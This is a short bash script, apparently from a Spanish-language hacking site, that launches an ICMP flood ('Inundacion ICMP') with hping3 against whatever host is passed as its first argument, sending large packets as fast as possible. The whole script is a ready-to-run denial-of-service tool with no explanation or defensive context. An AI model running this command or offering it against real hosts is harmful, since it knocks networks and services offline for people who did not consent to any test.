#!/bin/bash
# (c) hacking y seguridad .com 2022
echo
echo "Inundacion ICMP"
hping3 $1 -1 --flood -d 1440 -e "Inundacion ICMP"
